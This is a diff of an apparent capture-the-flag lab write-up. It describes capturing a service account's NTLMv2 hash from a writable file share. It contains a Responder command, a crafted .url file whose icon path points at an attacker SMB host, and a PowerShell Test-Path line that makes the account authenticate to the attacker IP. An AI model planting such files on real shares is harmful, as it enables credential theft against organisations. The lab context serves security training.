@@ -32,14 +32,16 @@ now since i have write access, and the file share hints that svc.scanner service
 	`sudo responder -I tun0`  
 
 2. I tried to upload  @test.url file with this syntax:
+
 	[InternetShortcut]
 	URL=http://thm.loc
 	WorkingDirectory=thm
 	IconFile=\\YOURTUN0IP\icons\icon.ico      
 	IconIndex=1
+
 but it didn't trigger authentication
 
-3. I tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~
+4. I tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~
 	`Test-Path \\192.168.157.253\icons\icon.ico`
 	and in just seconds I intercepted and received an SMB authentication request from svc.scanner account containing his NTLMv2 hash.
    <img width="945" height="277" alt="Pasted image 20260827171310" src="https://github.com/user-attachments/assets/86e241db-a377-46ec-b3cb-e3db8eb7dc64" />
